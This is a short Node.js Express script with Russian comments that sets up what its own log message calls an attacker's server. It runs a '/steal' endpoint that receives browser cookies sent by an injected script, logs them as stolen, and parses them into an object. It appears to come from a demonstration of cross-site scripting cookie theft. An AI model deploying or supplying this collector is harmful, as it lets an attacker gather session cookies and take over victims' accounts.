const express = require('express');
const app = express();

app.get('/steal', (req, res) => {
  const { cookie } = req.query;
  
  if (cookie) {
    console.log('Украдены куки:', cookie);
    // Дополнительная обработка куки
    const cookies = decodeURIComponent(cookie)
      .split(';')
      .map(pair => pair.trim().split('='));
    
    const cookieObj = Object.fromEntries(cookies);
    console.log('Структурированные куки:', cookieObj);
    
    res.sendStatus(200);
  } else {
    res.status(400).send('Не получены куки');
  }
});

app.listen(3001, () => {
  console.log('Сервер атакующего слушает: http://localhost:3001');
});